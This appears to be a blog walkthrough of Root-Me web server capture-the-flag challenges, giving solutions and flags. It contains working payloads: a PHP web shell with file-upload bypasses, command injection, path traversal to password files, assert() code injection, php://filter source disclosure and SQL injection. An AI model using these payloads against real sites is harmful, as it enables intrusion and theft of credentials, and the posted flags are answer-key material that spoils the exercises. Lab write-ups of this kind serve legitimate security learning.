@@ -1,0 +1,225 @@
+ROOT-ME WEB SERVER CHALLENGE SOLUTIONS
+JANUARY 10, 2018 | SHADOW
+The following is a walk through to solving root-me.org’s web server challenges (work in progress).
+
+HTML
+
+As always, check the source code for the password.
+
+nZ^&@q5&sjJHev0
+
+COMMAND INJECTION
+
+127.0.0.1;cat index.php
+flag: S3rv1ceP1n9Sup3rS3cure
+
+OPEN REDIRECT
+
+Check source code.  You can see that when an option is selected, you are redirected to, for example, https://facebook.com&h=……&#8230;.  We need to figure out what the value followed by ‘&h=’ is so we can structure our redirect url accordingly.  Using an online md5 hash to text converter, we see the value represents the hashed value of the particular url.  MD5 hash ‘https://google.com&#8217; and note the value.  Start tamper data and click the facebook link.  Edit the url so the website redirects to ‘?url=https://google.com&h=<MD5hash https://google.com>&#8217; instead of facebook.  Then submit the page.
+
+e6f8a530811d5a479812d7b82fc1a5c5
+
+USER-AGENT
+
+User tamper data to change the user-agent from it’s original value to ‘admin’.
+
+RR$LI9%L34QD1AAE27
+
+HTTP DIRECTORY INDEXING
+
+Clue: Control + U
+
+<!– include(“admin/pass.html”) –>
+
+Navigate to:
+
+http://challenge01.root-me.org/web-serveur/ch4/admin/pass.html
+
+J’ai bien l’impression que tu t’es fait avoir / Got rick rolled ? 😉
+T’inquiète tu n’es pas le dernier / You’re not the last :p
+
+Cherche BIEN / Just search
+
+Transverse up to admin directory
+
+/web-serveur/ch4/admin/
+
+FILE NAME  ↓ 	FILE SIZE  ↓ 	DATE  ↓ 
+Parent directory/	–	–
+backup/	–	02-Apr-2013 12:35
+pass.html	346	24-Oct-2015 11:14
+Select backup, then admin.txt
+Password: LINUX
+
+HTTP TAMPERING
+
+‘Http response gives us informations’
+
+I used the Firefox extension ‘Open HTTP Requester’ to solve this challenge.  Issuing a request to the page I see a header named ‘Header-Rootme-Admin’ with a value set to none.  To successfully complete the challenge I issued the request again, this time adding a custom header to the request: ‘Header-Rootme-Admin’ with a value of ‘admin’.
+
+HeadersMayBeUseful
+
+VERB TAMPERING
+
+Authorization can sometimes be bypassed by tampering with HTTP methods.  For this exercise I utilized the Firefox extension ‘Open HTTP requester’ to send a put request to http://challenge01.root-me.org/web-serveur/ch8/ and get the password to the challenge.
+
+a23e$dme96d3saez$$prap
+
+INSTALL FILES
+
+‘You know phpbb’
+
+Phpbb’s installation folders are located in ‘phpbb/install/install.php’ so I appended that to the end of the challenge’s url.
+
+karambar
+
+IMPROPER REDIRECT
+
+To solve this challenge I used OWASP’s ZAP Proxy to capture the request sent to http://challenge01.root-me.org/web-serveur/ch32/index.php
+
+Selection_309
+
+FILE UPLOAD
+
+DOUBLE FILE EXTENSION
+
+Referring to the documentation provided along with this challenge, I wrote a quick php script:
+
+<?php
+
+system ($_GET[‘command’]);
+
+?>
+
+and saved it as php_shell.php.jpg.  Sometimes you can trick the web server into accepting your php file by adding an acceptable file extension (jpg, png, gif) to the end of the php file extension.  After uploading the file, we navigate to it and inject our command into the url.
+
+‘…..php_shell.php.jpg?command=cat ../../../.passwd’
+
+ 
+
+FILE UPLOAD
+
+MIME Type
+
+For this challenge, we use burp to capture the post request sent to the server when trying to upload our php shell script and change the ‘content-type’ from ‘application/x-php’ to ‘image/jpeg’.  This will trick the server into accepting the upload, thinking it’s a jpg file.  Click icon on our file and, like before, inject our command into the url:
+
+http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/gsejso5erm5ahvm8i561a9tdh7//shell.php?command=cat%20../../../.passwd
+
+a7n4nizpgQgnPERy89uanf6T4
+
+HTTP COOKIES
+
+This challenged really irritated me because it took me 3 different plugins to find one that would work.  Once I did, solving the challenge is a no-brainer.  Click on ‘saved email addresses’, we get an error that says we must be admin.  Checking the url:
+
+http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur
+
+but simply replacing ‘visiteur’ with ‘admin’ we get an error that says there’s an issue with the cookie value.  Install the firefox plugin ‘Live HTTP Headers’ and click the ‘Saved email addresses’ link again.  In live http headers, you can see the cookie: ch7=visiteur. Click ‘replay’ and change ‘visiteur’ to ‘admin’, then replay again. In the browser click the link once more to find the validation password.
+
+Validation password : ml-SYMPA
+
+PHP ASSERT()
+
+In php, assert() will evaluate whether an assertion supplied is TRUE or FALSE.  If FALSE, it will take appropriate action.
+
+We have the following url:
+
+http://challenge01.root-me.org/web-serveur/ch47/?page=home
+
+ 
+
+http://challenge01.root-me.org/web-serveur/ch47/?page=index.php../../../../../etc/passwd.php throws the following error:
+
+Warning: assert(): Assertion “strpos(‘includes/index.php../../../../../etc/passwd.php’, ‘..’) === false”
+
+http://challenge01.root-me.org/web-serveur/ch47/?page=&#8217;,’s’) and system(‘cat .passwd’) and strpos(‘
+
+ 
+
+ 
+
+FILE UPLOAD
+
+NULL BYTE
+
+Passing this level is super easy.  Use the same shell as before.  Say your the file name of your shell is shell.php.  Rename it to shell.php%00.jpg.  When submitted, the .jpg file extension will be dropped due to the preceding nullbyte.  Once the file has uploaded, click it.
+
+YPNchi2NmTwygr2dgCCF
+
+ 
+
+DIRECTORY TRANSVERSAL
+
+We have url like this: http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes.
+
+The parameter galerie displays different categories.  We can deduce ‘galerie’ holds all the files.  Navigating to http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie= we can see a hidden folder beginning with ’86hv’.  Move your mouse above the icon and right click, select inspect element to get the full folder name.
+
+86hwnX2r
+
+Selection_311
+
+Navigate to http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r, you’ll see a file password.txt.  Right click and view the source code.  Click the ‘password.txt’ hyperlink for the password.
+
+kcb$!Bx@v4Gs9Ez
+
+PHP FILTER
+
+PHP filters are used to validate and sanitize external input.
+
+There are number of filters that can be applied.  One built in filter is convert.*
+base64-encode and base64-decode, the former of which will be used in this exploit.
+It will go like php://filter/filter_to_use
+
+In this exploit:
+
+http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode
+
+When clicking the login hyperlink, we can see what the script is doing:
+
+http://challenge01.root-me.org/web-serveur/ch12/?inc= login.php
+php://filter/convert.base64-encode/resource allows us to read any source of a php file. It forces PHP to base64 encode the file before it is used in the require statement.  From there decoding the base64 string will give us the source code for whichever php file is called by parameter ‘resource’.
+
+Example:
+
+http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=index.php.
+
+We continue guessing helpful php files such as config.php
+http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
+
+<?php
+
+$username=”admin”;
+$password=”DAPt9D2mky0APAF”;
+
+?>
+
+PHP GLOBALS
+
+Navigate to …./index.php.bak and open the file.
+
+This is the important stuff
+
+…..
+
+if (( isset ($password) && $password!=”” && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION[“logged”]==1 ) ){
+$aff=display(“well done, you can validate with the password : $hidden_password”);
+} else {
+$aff=display(“try again”);
+}
+
+…….
+
+It says ‘if password blah….OR _SESSION[logged]=1′ “well done, you can validate with the password:’
+
+So let’s add ‘?_SESSION[logged]=1’ to the url.
+
+http://challenge01.root-me.org/web-serveur/ch17/?_SESSION%5Blogged%5D=1
+
+well done, you can validate with the password : NoTQYipcRKkgrqG
+
+SQL INJECTION
+
+Find administrator password.
+
+On the first try I got it.  User name admin, password ‘ or 1=1–
+
+The next page says ‘Welcome user1’ then has the password of the user obscured.  Highlight the entry and right click your mouse then select ‘inspect element’.
